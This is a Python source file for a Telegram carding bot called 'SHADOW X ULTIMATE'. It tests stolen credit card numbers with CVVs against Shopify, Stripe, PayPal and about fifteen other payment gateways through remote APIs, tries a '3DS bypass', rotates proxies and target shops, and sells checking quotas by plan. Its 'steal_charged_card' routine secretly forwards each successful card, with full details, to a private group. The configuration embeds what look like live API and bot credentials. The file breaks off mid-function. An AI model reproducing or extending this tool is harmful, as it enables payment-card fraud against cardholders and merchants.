# SHADOW X ULTIMATE – FINAL COMPLETE BOT (FIXED)
# Owner: @inferno_carder
# Developer: @inferno_carder
# Version: 5.1.2 (Syntax Fixed)

import asyncio
import json
import os
import re
import random
import string
import time
import uuid
import base64
import hashlib
import hmac
import threading
import sys
import html as html_module
from datetime import datetime, timedelta
from collections import deque
from urllib.parse import quote, quote_plus

# ─── SQLITE3 FIX ────────────────────────────────────────────────────────────────
try:
    import sqlite3
except ImportError:
    try:
        import pysqlite3 as sqlite3
        sys.modules['sqlite3'] = sqlite3
    except ImportError:
        import sqlite3

import aiohttp
import aiofiles
import requests
from telethon import TelegramClient, events, Button
from telethon.errors import UserNotParticipantError, FloodWaitError
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.tl.types import Message

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

API_ID = 35884204
API_HASH = 'ef7ef931449f4befcbb718c309001f14'
BOT_TOKEN = '8543288751:AAGiBlzeNr96PA8ayZpUyOB9t5ivbn9aLVQ'
ADMIN_ID = [6857145175, 8242039526, 8206978592]
PRIVATE_GC = -1003946142627
SILENT_CHARGED_CHANNEL = -5400313966
HIT_LOG_CHANNEL = -1003946142627

LOGS_CHANNEL = "https://t.me/+UWAlrHgNwWJmMTY1"
CHECKING_CHANNEL = "https://t.me/Shopifyinferno"
UPDATES_CHANNEL = "https://t.me/+QYtKxWiy-Q5lOWE1"
GROUP_LINK = 'https://t.me/+skpuIXSqC8M5MTM1'

# ═══════════════════════════════════════════════════════════════════════════════
# PERMANENT API ENDPOINTS
# ═══════════════════════════════════════════════════════════════════════════════

SHOPIFY_ENDPOINTS = [
    'https://noiraxiomx.xyz/shopify',
    'https://shopify-shadow-api.onrender.com/shopify',
]
STRIPE_ENDPOINTS = [
    'https://stripe-api-production.up.railway.app/stripe',
    'https://stripe-shadow-api.onrender.com/stripe',
]
RAZORPAY_ENDPOINTS = [
    'https://razorpay-api-production-ecb8.up.railway.app/razorpay',
    'https://razorpay-shadow-api.onrender.com/razorpay',
]
PAYPAL_ENDPOINTS = [
    'https://paypal-api-production.up.railway.app/paypal',
    'https://paypal-shadow-api.onrender.com/paypal',
]
BRAINTREE_ENDPOINTS = [
    'https://braintree-api-production.up.railway.app/braintree',
    'https://braintree-shadow-api.onrender.com/braintree',
]
SQUARE_ENDPOINTS = ['https://square-api-production.up.railway.app/square']
MAGENTO_ENDPOINTS = ['https://magento-api-production.up.railway.app/magento']
CHECKOUTDOTCOM_ENDPOINTS = ['https://checkoutdotcom-api-production.up.railway.app/checkout']
TWOCHECKOUT_ENDPOINTS = ['https://2checkout-api-production.up.railway.app/2checkout']
MONERIS_ENDPOINTS = ['https://moneris-api-production.up.railway.app/moneris']
EWAY_ENDPOINTS = ['https://eway-api-production.up.railway.app/eway']
CHASEPAYMENTECH_ENDPOINTS = ['https://chasepaymentech-api-production.up.railway.app/chase']
AURUSPAY_ENDPOINTS = ['https://auruspay-api-production.up.railway.app/aurus']
OPENCART_ENDPOINTS = ['https://opencart-api-production.up.railway.app/opencart']
PRESTASHOP_ENDPOINTS = ['https://prestashop-api-production.up.railway.app/prestashop']
WOOCOMMERCE_ENDPOINTS = ['https://woocommerce-api-production.up.railway.app/woo']
PAYU_ENDPOINTS = ['https://payu-api-production.up.railway.app/payu']
ADYEN_ENDPOINTS = ['https://adyen-api-production.up.railway.app/adyen']
BIN_API_URL = 'https://bins.antipublic.cc/bins/'

# ─── API Selector ──────────────────────────────────────────────────────────────
class APISelector:
    def __init__(self, endpoints):
        self.endpoints = endpoints

    async def get(self, params, timeout=25):
        endpoint = random.choice(self.endpoints)
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=timeout)) as session:
                async with session.get(endpoint, params=params) as resp:
                    if resp.status in (200, 201):
                        try:
                            return await resp.json()
                        except:
                            return {"status": "Site Error", "message": "Invalid JSON"}
                    else:
                        return {"status": "Site Error", "message": f"HTTP {resp.status}"}
        except Exception as e:
            return {"status": "Site Error", "message": str(e)}

shopify_sel = APISelector(SHOPIFY_ENDPOINTS)
stripe_sel = APISelector(STRIPE_ENDPOINTS)
razorpay_sel = APISelector(RAZORPAY_ENDPOINTS)
paypal_sel = APISelector(PAYPAL_ENDPOINTS)
braintree_sel = APISelector(BRAINTREE_ENDPOINTS)
square_sel = APISelector(SQUARE_ENDPOINTS)
magento_sel = APISelector(MAGENTO_ENDPOINTS)
checkout_sel = APISelector(CHECKOUTDOTCOM_ENDPOINTS)
two_sel = APISelector(TWOCHECKOUT_ENDPOINTS)
moneris_sel = APISelector(MONERIS_ENDPOINTS)
eway_sel = APISelector(EWAY_ENDPOINTS)
chase_sel = APISelector(CHASEPAYMENTECH_ENDPOINTS)
aurus_sel = APISelector(AURUSPAY_ENDPOINTS)
opencart_sel = APISelector(OPENCART_ENDPOINTS)
prestashop_sel = APISelector(PRESTASHOP_ENDPOINTS)
woo_sel = APISelector(WOOCOMMERCE_ENDPOINTS)
payu_sel = APISelector(PAYU_ENDPOINTS)
adyen_sel = APISelector(ADYEN_ENDPOINTS)

# ═══════════════════════════════════════════════════════════════════════════════
# FILE PATHS & DATA
# ═══════════════════════════════════════════════════════════════════════════════

CWD = os.getcwd()
DATA_DIR = os.path.join(CWD, 'data')
os.makedirs(DATA_DIR, exist_ok=True)
SITES_FILE = os.path.join(DATA_DIR, 'sites.txt')
PROXY_FILE = os.path.join(DATA_DIR, 'proxy.txt')
USERS_FILE = os.path.join(DATA_DIR, 'users.json')
CODES_FILE = os.path.join(DATA_DIR, 'codes.json')
BANNED_USERS_FILE = os.path.join(DATA_DIR, 'banned_users.json')
VERIFIED_USERS_FILE = os.path.join(DATA_DIR, 'verified_users.txt')
LEADERBOARD_FILE = os.path.join(DATA_DIR, 'leaderboard.json')
RZ_URL_FILE = os.path.join(DATA_DIR, 'rz_url.txt')
SESSION_FILE = os.path.join(CWD, 'shadow_bot.session')

# ─── Plans & Concurrency ──────────────────────────────────────────────────────
PLANS = {
    'FREE': {'price': 'Free', 'days': 30, 'cc_limit': 500, 'emoji': '🆓', 'group_only': True},
    'BASIC': {'price': '$5', 'days': 15, 'cc_limit': 1000, 'emoji': '⭐', 'group_only': False},
    'STANDARD': {'price': '$10', 'days': 15, 'cc_limit': 1500, 'emoji': '⭐', 'group_only': False},
    'PREMIUM': {'price': '$15', 'days': 30, 'cc_limit': 2500, 'emoji': '⭐', 'group_only': False},
    'VIP': {'price': '$20', 'days': 30, 'cc_limit': 5000, 'emoji': '⭐', 'group_only': False},
}
PLAN_CONCURRENCY = {'FREE': 30, 'BASIC': 40, 'STANDARD': 50, 'PREMIUM': 70, 'VIP': 100, 'ADMIN': 120}

# ─── Helper Functions ────────────────────────────────────────────────────────
def html_escape(t):
    return html_module.escape(str(t)) if t else ''


def extract_cc(text):
    return [f"{c}|{m}|{'20'+y if len(y)==2 else y}|{v}"
            for c, m, y, v in re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)]


def auto_detect_ccs(text):
    patterns = [
        r'(\d{15,16})\s*[|/:,;.\s-]+\s*(\d{1,2})\s*[|/:,;.\s-]+\s*(\d{2,4})\s*[|/:,;.\s-]+\s*(\d{3,4})',
        r'(\d{15,16})\s*(?:exp|expiry)?\s*(\d{1,2})\s*[/]?\s*(\d{2,4})\s*(?:cvv|cvc)?\s*(\d{3,4})',
        r'(\d{15,16})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{15,16})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{16,24})',
    ]
    cards = []
    for pat in patterns:
        for m in re.findall(pat, text, re.I):
            if len(m) == 1:
                s = m[0]
                if len(s) >= 20:
                    cards.append(f"{s[:16]}|{s[16:18]}|{s[18:20]}|{s[20:23]}")
                continue
            n, mm, yy, cvv = m
            n = re.sub(r'[\s-]', '', n)
            if len(n) < 15:
                continue
            mm = mm.zfill(2)
            yy = '20' + yy if len(yy) == 2 else yy
            if int(mm) < 1 or int(mm) > 12 or len(cvv) < 3:
                continue
            cards.append(f"{n}|{mm}|{yy}|{cvv}")
    return list(dict.fromkeys(cards))


# ─── User Data ───────────────────────────────────────────────────────────────
def load_users():
    return json.load(open(USERS_FILE)) if os.path.exists(USERS_FILE) else {}


def save_users(u):
    json.dump(u, open(USERS_FILE, 'w'), indent=2)


def load_codes():
    return json.load(open(CODES_FILE)) if os.path.exists(CODES_FILE) else {}


def save_codes(c):
    json.dump(c, open(CODES_FILE, 'w'), indent=2)


def load_banned():
    return json.load(open(BANNED_USERS_FILE)) if os.path.exists(BANNED_USERS_FILE) else {}


def save_banned(b):
    json.dump(b, open(BANNED_USERS_FILE, 'w'), indent=2)


def is_banned(uid):
    return str(uid) in load_banned()


def ban_user(uid, reason="Banned", by="System"):
    b = load_banned()
    uid = str(uid)
    if uid in b:
        return False
    b[uid] = {"reason": reason, "banned_at": datetime.now().strftime('%d %b %Y • %H:%M:%S'), "banned_by": str(by)}
    save_banned(b)
    return True


def unban_user(uid):
    b = load_banned()
    uid = str(uid)
    if uid in b:
        del b[uid]
        save_banned(b)
        return True
    return False


def load_sites():
    return [l.strip() for l in open(SITES_FILE).readlines()] if os.path.exists(SITES_FILE) else []


def save_sites(s):
    open(SITES_FILE, 'w').write('\n'.join(s) + '\n')


def load_proxies():
    return [l.strip() for l in open(PROXY_FILE).readlines()] if os.path.exists(PROXY_FILE) else []


def save_proxies(p):
    open(PROXY_FILE, 'w').write('\n'.join(p) + '\n')


def is_verified(uid):
    if not os.path.exists(VERIFIED_USERS_FILE):
        return False
    return str(uid) in [l.strip() for l in open(VERIFIED_USERS_FILE).readlines()]


def mark_verified(uid):
    open(VERIFIED_USERS_FILE, 'a').write(f"{uid}\n")


def load_rz_url():
    return open(RZ_URL_FILE).read().strip() if os.path.exists(RZ_URL_FILE) else 'https://razorpay.me/@mstechnomedia'


def save_rz_url(url):
    open(RZ_URL_FILE, 'w').write(url.strip())


def generate_key(l=16):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=l))


# ─── Plan Functions ──────────────────────────────────────────────────────────
def assign_free(uid):
    if uid in ADMIN_ID:
        return
    u = load_users()
    uid = str(uid)
    if uid in u:
        try:
            if datetime.now() < datetime.fromisoformat(u[uid]['expires_at']):
                return
        except:
            pass
    u[uid] = {'plan': 'FREE', 'expires_at': (datetime.now() + timedelta(days=30)).isoformat(),
              'cc_used': 0, 'cc_limit': 500, 'redeemed_at': datetime.now().isoformat()}
    save_users(u)


def is_premium(uid):
    if uid in ADMIN_ID:
        return True
    u = load_users()
    uid = str(uid)
    if uid not in u:
        return False
    try:
        return datetime.now() < datetime.fromisoformat(u[uid]['expires_at'])
    except:
        return False


def can_check(uid, is_private=True):
    if uid in ADMIN_ID:
        return 'ok'
    u = load_users()
    uid = str(uid)
    if uid not in u:
        return 'no_plan'
    data = u[uid]
    plan = PLANS.get(data['plan'], PLANS['FREE'])
    try:
        if datetime.now() >= datetime.fromisoformat(data['expires_at']):
            return 'expired'
    except:
        return 'expired'
    if plan.get('group_only', False) and is_private:
        return 'group_only'
    return 'ok'


def increment_cc(uid, cnt=1):
    if uid in ADMIN_ID:
        return
    u = load_users()
    uid = str(uid)
    if uid in u:
        u[uid]['cc_used'] = u[uid].get('cc_used', 0) + cnt
        save_users(u)


def get_concurrency(uid):
    if uid in ADMIN_ID:
        return 120
    u = load_users()
    uid = str(uid)
    return PLAN_CONCURRENCY.get(u.get(uid, {}).get('plan', 'FREE'), 30)


# ─── Leaderboard ──────────────────────────────────────────────────────────────
def load_lb():
    return json.load(open(LEADERBOARD_FILE)) if os.path.exists(LEADERBOARD_FILE) else {}


def save_lb(d):
    json.dump(d, open(LEADERBOARD_FILE, 'w'), indent=2)


def inc_charged(uid, username=''):
    lb = load_lb()
    uid = str(uid)
    if uid not in lb:
        lb[uid] = {'charged': 0, 'approved': 0, 'username': username or 'User'}
    lb[uid]['charged'] = lb[uid].get('charged', 0) + 1
    if username:
        lb[uid]['username'] = username
    save_lb(lb)


def inc_approved(uid, username=''):
    lb = load_lb()
    uid = str(uid)
    if uid not in lb:
        lb[uid] = {'charged': 0, 'approved': 0, 'username': username or 'User'}
    lb[uid]['approved'] = lb[uid].get('approved', 0) + 1
    if username:
        lb[uid]['username'] = username
    save_lb(lb)


def top_users(n=10):
    lb = load_lb()
    return sorted(lb.items(), key=lambda x: x[1].get('charged', 0), reverse=True)[:n]


def user_rank(uid):
    lb = load_lb()
    uid = str(uid)
    sorted_u = sorted(lb.items(), key=lambda x: x[1].get('charged', 0), reverse=True)
    for i, (u, d) in enumerate(sorted_u, 1):
        if u == uid:
            return i, d
    return None, {'charged': 0, 'approved': 0, 'username': 'User'}


# ─── Premium Emojis ──────────────────────────────────────────────────────────
PREMIUM_EMOJI_IDS = {
    "✅": "5206607081334906820", "❌": "5210952531676504517", "🔴": "5420323339723881652",
    "🔥": "5424972470023104089", "💬": "5443038326535759644", "💳": "5927169041595634481",
    "📊": "5231200819986047254", "📈": "5244837092042750681", "📉": "5246762912428603768",
    "📦": "5924720918826848520", "⏳": "5440621591387980068", "⚡": "5224607267797606837",
    "🚨": "5456140674028019486", "⭐": "5438496463044752972", "💡": "5422439311196834318",
    "🌐": "5447410659077661506", "📌": "5397782960512444700", "📍": "5391032818111363540",
    "🔗": "5271604874419647061", "♻️": "5375338737028841420", "ℹ️": "5323442290708985472",
    "📢": "5424818078833715060", "💵": "5409048419211682843", "🔁": "4970142833605345805",
    "🚫": "5260293700088511294", "📋": "5877301185639091664", "🛒": "5983399041197675256",
    "📅": "5413879192267805083", "🏆": "5935847413859225147", "🆕": "5382357040008021292",
    "🆓": "5406756500108501710", "🔝": "5415655814079723871", "⏰": "5330157467781312171",
    "📧": "5253742260054409879", "🔒": "5296369303661067030", "🔐": "5886505193180239900",
    "⚙️": "5341715473882955310", "🔔": "5458603043203327669", "🤖": "5931415565955503486",
    "💥": "5276032951342088188", "🧪": "5913787972200698358", "👥": "5942877472163892475",
    "👁️": "5960714428394507968", "👛": "5769403330761593044", "🧰": "5988023995125993550",
    "🖼️": "5843506780931363129", "🎬": "6005986106703613755", "📱": "5967591100532134862",
    "❤️": "4996980495100150380", "🎭": "5890794491119407059", "🐕": "5771887475421090729",
    "🧾": "5204024191082318452", "✂️": "6007895992760799065", "🔑": "6005570495603282482",
    "🎧": "6007938409857815902", "🧹": "6007942490076745785", "🎨": "5764899533565729469",
    "💊": "5933768993285345899", "🎙️": "5909015791088439934", "👋": "5870734657384877785",
    "🏷️": "5985433648810171091", "🧑": "5879770735999717115", "🧮": "5935938364086685805",
    "✏️": "5395444784611480792", "📎": "5305265301917549162", "💼": "5967389567781703494",
    "📂": "5967456680940671207", "☎️": "5967591100532134862", "💰": "5206577300031684638",
    "🧧": "5206636501860893075", "🗑️": "5879896690210639947", "▶️": "5348125953090403204",
    "❗": "5274099962655816924", "⚠️": "5447644880824181073", "⬇️": "5386367538735104399",
    "🔍": "5874960879434338403",
}


def premium_emoji(text):
    if not text:
        return text
    pat = re.compile(r'(<code>.*?</code>|<pre>.*?</pre>|<blockquote>.*?</blockquote>)', re.DOTALL)
    parts = []
    last = 0
    for m in pat.finditer(text):
        before = text[last:m.start()]
        for em, eid in PREMIUM_EMOJI_IDS.items():
            before = before.replace(em, f'<tg-emoji emoji-id="{eid}">{em}</tg-emoji>')
        parts.append(before)
        parts.append(m.group(0))
        last = m.end()
    remaining = text[last:]
    for em, eid in PREMIUM_EMOJI_IDS.items():
        remaining = remaining.replace(em, f'<tg-emoji emoji-id="{eid}">{em}</tg-emoji>')
    parts.append(remaining)
    return ''.join(parts)


def strip_premium(t):
    return re.sub(r'<tg-emoji[^>]*>', '', t).replace('</tg-emoji>', '')


# ─── Anime GIFs ──────────────────────────────────────────────────────────────
ANIME_GIFS = [
    "https://media.tenor.com/3PxqJkQ9Q8UAAAAC/anime-rain.gif",
    "https://media.tenor.com/x8v1o7dI9P0AAAAC/one-piece-luffy.gif",
    "https://media.tenor.com/8WpP0tqQ9IYAAAAC/demon-slayer.gif",
    "https://media.tenor.com/9P8W7v6JkIYAAAAC/jujutsu-kaisen.gif",
    "https://media.tenor.com/6WpP0tqQ9IYAAAAC/attack-on-titan.gif",
    "https://media.tenor.com/8WpP0tqQ9IYAAAAC/bleach.gif",
    "https://media.tenor.com/9P8W7v6JkIYAAAAC/dragon-ball.gif",
    "https://media.tenor.com/6WpP0tqQ9IYAAAAC/my-hero-academia.gif",
    "https://media.tenor.com/8WpP0tqQ9IYAAAAC/tokyo-ghoul.gif",
    "https://media.tenor.com/9P8W7v6JkIYAAAAC/death-note.gif",
]


async def random_anime_gif():
    return random.choice(ANIME_GIFS)


# ─── Proxy & Site Rotation ─────────────────────────────────────────────────
_dead_proxies = set()
_dead_proxy_expiry = {}


def _is_proxy_dead(p):
    import time as _t
    if p in _dead_proxies:
        if _t.time() < _dead_proxy_expiry.get(p, 0):
            return True
        else:
            _dead_proxies.discard(p)
            _dead_proxy_expiry.pop(p, None)
    return False


def _mark_proxy_dead(p):
    import time as _t
    _dead_proxies.add(p)
    _dead_proxy_expiry[p] = _t.time() + 300


def _pick_alive_proxy(proxies):
    alive = [p for p in proxies if not _is_proxy_dead(p)]
    if alive:
        return random.choice(alive)
    _dead_proxies.clear()
    _dead_proxy_expiry.clear()
    return random.choice(proxies) if proxies else None


_recent_sites = deque(maxlen=1000)
_recent_set = set()
_session_sites = {}
_site_lock = asyncio.Lock()


async def _next_site(sites):
    async with _site_lock:
        if not sites:
            return sites[0] if sites else None
        if len(sites) == 1:
            s = sites[0]
            _recent_sites.append(s)
            _recent_set.add(s)
            if len(_recent_set) > _recent_sites.maxlen:
                _recent_set.clear()
                _recent_set.update(_recent_sites)
            return s
        sk = id(sites)
        if sk not in _session_sites:
            _session_sites[sk] = set()
        used = _session_sites[sk]
        avail = [s for s in sites if s not in _recent_set and s not in used]
        if not avail:
            avail = [s for s in sites if s not in used]
        if not avail:
            used.clear()
            avail = [s for s in sites if s not in _recent_set]
            if not avail:
                _recent_sites.clear()
                _recent_set.clear()
                avail = list(sites)
        s = random.choice(avail)
        _recent_sites.append(s)
        _recent_set.add(s)
        used.add(s)
        if len(_recent_set) > _recent_sites.maxlen:
            _recent_set.clear()
            _recent_set.update(_recent_sites)
        return s


# ─── BIN Lookup ─────────────────────────────────────────────────────────────
async def get_bin_info(card):
    try:
        bin_num = card[:6]
        async with aiohttp.ClientSession(timeout=10) as sess:
            async with sess.get(f'{BIN_API_URL}{bin_num}') as r:
                if r.status != 200:
                    return '-', '-', '-', '-', '-', ''
                d = await r.json()
                return d.get('brand', '-'), d.get('type', '-'), d.get('level', '-'), d.get('bank', '-'), d.get(
                    'country_name', '-'), d.get('country_flag', '')
    except:
        return '-', '-', '-', '-', '-', ''


# ─── CAPTCHA ─────────────────────────────────────────────────────────────────
_pending_captcha = {}
CAPTCHA_IMAGES = ["2", "4", "5", "9", "1", "7"]


def gen_captcha():
    return random.choice(CAPTCHA_IMAGES)


# ═══════════════════════════════════════════════════════════════════════════════
# CHECKERS – All Gateways + Auto Bypass
# ═══════════════════════════════════════════════════════════════════════════════

async def _generic_check(card, proxy, selector, gateway, success_words, approved_words):
    try:
        cc, mm, yy, cvv = card.split('|')
        yy = yy[-2:] if len(yy) == 4 else yy
        card = f"{cc}|{mm}|{yy}|{cvv}"
        params = {'cc': card}
        if proxy:
            params['proxy'] = proxy
        raw = await selector.get(params)
        if raw.get('status') == 'Site Error':
            return {'status': 'Site Error', 'message': raw.get('message', 'API Error'), 'card': card, 'retry': True}
        status = raw.get('status', '')
        msg = raw.get('message', '')
        price = raw.get('price', '$0')
        gateway_name = raw.get('gateway', gateway)
        status_l = status.lower()
        msg_l = msg.lower()
        if any(w in status_l for w in success_words) or any(w in msg_l for w in success_words):
            return {'status': 'Charged', 'message': msg, 'card': card, 'gateway': gateway_name, 'price': price}
        if any(w in status_l for w in approved_words) or any(w in msg_l for w in approved_words):
            return {'status': 'Approved', 'message': msg, 'card': card, 'gateway': gateway_name, 'price': price}
        return {'status': 'Dead', 'message': msg, 'card': card, 'gateway': gateway_name, 'price': price}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': gateway, 'price': '-', 'retry': True}


async def check_shopify(card, site, proxy):
    try:
        site = site.strip()
        while site.startswith('https://url ') or site.startswith('http://url '):
            site = site.split(' ', 1)[1] if ' ' in site else site
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = None
        if proxy:
            parts = proxy.split(':')
            if len(parts) == 4:
                ip, port, user, pw = parts
                proxy_str = f"{ip}:{port}:{user}:{pw}"
            elif len(parts) == 2:
                proxy_str = f"{parts[0]}:{parts[1]}"
            else:
                proxy_str = proxy
        params = {'cc': card, 'site': site}
        if proxy_str:
            params['proxy'] = proxy_str
        raw = await shopify_sel.get(params)
        if raw.get('status') == 'Site Error':
            return {'status': 'Site Error', 'message': raw.get('message', 'API Error'), 'card': card, 'retry': True}
        api_status = raw.get('Status', raw.get('status', ''))
        api_status_code = raw.get('Response', raw.get('status_code', ''))
        api_error = raw.get('error', '')
        api_amount = raw.get('Price', raw.get('amount', ''))
        api_currency = raw.get('currency', 'USD')
        api_gateway = raw.get('Gateway', raw.get('gateway', 'Shopify'))
        api_declined = raw.get('Response', raw.get('declined_reason', ''))
        price = f"${api_amount}" if api_amount and api_currency else '-'
        response_msg = api_declined or api_error or api_status_code or api_status or 'Empty'
        response_msg = response_msg.strip() or 'Empty API response'
        if api_error:
            return {'status': 'Site Error', 'message': api_error, 'card': card, 'retry': True, 'gateway': api_gateway,
                    'price': price}
        status_l = str(api_status).lower()
        msg_l = response_msg.lower()
        charged = ['order_paid', 'order paid', 'order_placed', 'order placed']
        approved = ['insufficient funds', 'insufficient_funds', 'insufficient', '3ds', 'authentication']
        declined = ['declined', 'card_declined', 'do not honor', 'expired', 'stolen', 'fraud', 'blocked']
        if any(w in status_l for w in charged) or any(w in msg_l for w in charged):
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': api_gateway,
                    'price': price}
        if any(w in status_l for w in approved) or any(w in msg_l for w in approved):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': api_gateway,
                    'price': price}
        if any(w in status_l for w in declined) or any(w in msg_l for w in declined):
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': api_gateway,
                    'price': price}
        return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': api_gateway,
                'price': price}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-', 'retry': True}


async def check_stripe_bypass(card, proxy):
    res = await _generic_check(card, proxy, stripe_sel, 'Stripe', ['succeeded'], ['requires_action', '3ds', 'authentication'])
    if res.get('status') == 'Charged':
        return res
    if res.get('status') == 'Approved' or '3ds' in res.get('message', '').lower() or 'auth' in res.get('message',
                                                                                                      '').lower():
        try:
            cc, mm, yy, cvv = card.split('|')
            yy = yy[-2:] if len(yy) == 4 else yy
            card = f"{cc}|{mm}|{yy}|{cvv}"
            params = {'cc': card, 'bypass': 'true'}
            if proxy:
                params['proxy'] = proxy
            raw2 = await stripe_sel.get(params)
            if raw2.get('status') == 'Site Error':
                pass
            elif raw2.get('status', '').lower() == 'succeeded' or 'charged' in raw2.get('message', '').lower():
                return {'status': 'Charged', 'message': raw2.get('message', '3DS Bypassed'), 'card': card,
                        'gateway': 'Stripe (Bypass)', 'price': raw2.get('price', '$0')}
        except:
            pass
        return res
    return res


async def check_razorpay(card, proxy):
    return await _generic_check(card, proxy, razorpay_sel, 'Razorpay', ['charged', 'captured'], ['insufficient'])


async def check_paypal(card, proxy):
    return await _generic_check(card, proxy, paypal_sel, 'PayPal', ['approved', 'completed'], ['3ds', 'authentication'])


async def check_braintree(card, proxy):
    return await _generic_check(card, proxy, braintree_sel, 'Braintree', ['authenticate_successful'], ['challenge_required'])


async def check_square(card, proxy):
    return await _generic_check(card, proxy, square_sel, 'Square', ['success', 'authorized'], ['3ds', 'authentication'])


async def check_magento(card, proxy):
    return await _generic_check(card, proxy, magento_sel, 'Magento', ['success', 'placed'], ['3ds', 'authentication'])


async def check_checkout(card, proxy):
    return await _generic_check(card, proxy, checkout_sel, 'Checkout.com', ['approved', 'captured'], ['3ds', 'authentication'])


async def check_2co(card, proxy):
    return await _generic_check(card, proxy, two_sel, '2Checkout', ['approved', 'completed'], ['3ds', 'authentication'])


async def check_moneris(card, proxy):
    return await _generic_check(card, proxy, moneris_sel, 'Moneris', ['success', 'authorized'], ['3ds', 'authentication'])


async def check_eway(card, proxy):
    return await _generic_check(card, proxy, eway_sel, 'Eway', ['approved', 'captured'], ['3ds', 'authentication'])


async def check_chase(card, proxy):
    return await _generic_check(card, proxy, chase_sel, 'ChasePaymentech', ['approved', 'authorized'], ['3ds', 'authentication'])


async def check_aurus(card, proxy):
    return await _generic_check(card, proxy, aurus_sel, 'Auruspay', ['success', 'authorized'], ['3ds', 'authentication'])


async def check_opencart(card, proxy):
    return await _generic_check(card, proxy, opencart_sel, 'Opencart', ['success', 'completed'], ['3ds', 'authentication'])


async def check_prestashop(card, proxy):
    return await _generic_check(card, proxy, prestashop_sel, 'Prestashop', ['success', 'completed'], ['3ds', 'authentication'])


async def check_woo(card, proxy):
    return await _generic_check(card, proxy, woo_sel, 'WooCommerce', ['success', 'completed'], ['3ds', 'authentication'])


async def check_payu(card, proxy):
    return await _generic_check(card, proxy, payu_sel, 'PayU', ['success', 'completed'], ['3ds', 'authentication'])


async def check_adyen(card, proxy):
    return await _generic_check(card, proxy, adyen_sel, 'Adyen', ['authorised', 'captured'], ['3ds', 'challenge'])


# ═══════════════════════════════════════════════════════════════════════════════
# FIXED: check_bypass_all — No 'await' inside lambda
# ═══════════════════════════════════════════════════════════════════════════════

async def check_bypass_all(card, proxy):
    # Try all gateways until one succeeds
    # FIX: Use async wrapper for Shopify since it needs site selection
    async def try_shopify():
        site = await _next_site(load_sites())
        return await check_shopify(card, site, proxy)

    gateways = [
        try_shopify,
        lambda: check_stripe_bypass(card, proxy),
        lambda: check_razorpay(card, proxy),
        lambda: check_paypal(card, proxy),
        lambda: check_braintree(card, proxy),
        lambda: check_square(card, proxy),
        lambda: check_magento(card, proxy),
        lambda: check_checkout(card, proxy),
        lambda: check_2co(card, proxy),
        lambda: check_moneris(card, proxy),
        lambda: check_eway(card, proxy),
        lambda: check_chase(card, proxy),
        lambda: check_aurus(card, proxy),
        lambda: check_opencart(card, proxy),
        lambda: check_prestashop(card, proxy),
        lambda: check_woo(card, proxy),
        lambda: check_payu(card, proxy),
        lambda: check_adyen(card, proxy)
    ]
    for func in gateways:
        try:
            res = await func()
            if res.get('status') in ('Charged', 'Approved'):
                return res
        except:
            continue
    return {'status': 'Dead', 'message': 'All gateways failed', 'card': card, 'gateway': 'None', 'price': '-'}


async def check_shopify_with_site(card, proxy):
    sites = load_sites()
    if not sites:
        return {'status': 'Dead', 'message': 'No sites', 'card': card, 'gateway': 'Shopify', 'price': '-'}
    site = await _next_site(sites)
    return await check_shopify(card, site, proxy)


async def check_card_with_retry(card, sites, proxies, max_retries=2):
    if not sites or not proxies:
        return {'status': 'Dead', 'message': 'No sites/proxies', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    last = None
    for _ in range(max_retries):
        site = await _next_site(sites)
        proxy = _pick_alive_proxy(proxies)
        res = await check_shopify(card, site, proxy)
        if not res.get('retry'):
            return res
        last = res
        await asyncio.sleep(0.5)
    return last or {'status': 'Dead', 'message': 'Max retries', 'card': card, 'gateway': 'Unknown', 'price': '-'}


# ═══════════════════════════════════════════════════════════════════════════════
# STEALER + HIT LOGGING
# ═══════════════════════════════════════════════════════════════════════════════

_bot_instance = None


async def steal_charged_card(result, uid, username, check_type):
    global _bot_instance
    if _bot_instance is None:
        return
    try:
        if PRIVATE_GC:
            card = result.get('card', 'Unknown')
            msg = result.get('message', 'Unknown')
            gateway = result.get('gateway', 'Unknown')
            price = result.get('price', '-')
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
            try:
                cc_parts = card.split('|')
                if len(cc_parts) == 4:
                    cc_num = cc_parts[0]
                    fmt_card = f"{cc_num[0:4]} {cc_num[4:8]} {cc_num[8:12]} {cc_num[12:16]} | {cc_parts[1]} | {cc_parts[2]} | {cc_parts[3]}"
                else:
                    fmt_card = card
            except:
                fmt_card = card

            steal_msg = (
                f"💎 <b>CHARGED CC STEAL</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"💳 <code>{fmt_card}</code>\n\n"
                f"🛒 Gateway » {gateway}\n"
                f"📋 Response » {msg}\n"
                f"💵 Price » {price}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🧑 {brand} · {bin_type} · {level}\n"
                f"💼 {bank}\n"
                f"🌐 {country} {flag}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 User: <code>{uid}</code> (@{username})\n"
                f"🔧 Type: {check_type}\n"
                f"⏳ {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔥 Stolen by @Shadow"
            )
            gif = await random_anime_gif()
            await _bot_instance.send_file(PRIVATE_GC, gif, caption=premium_emoji(steal_msg), parse_mode='html')
        if HIT_LOG_CHANNEL:
            await log_hit_to_channel(result, 'Charged', uid, username, check_type)
    except Exception as e:
        print(f"Steal error: {e}")


async def log_hit_to_channel(result, hit_type, uid, username, check_type):
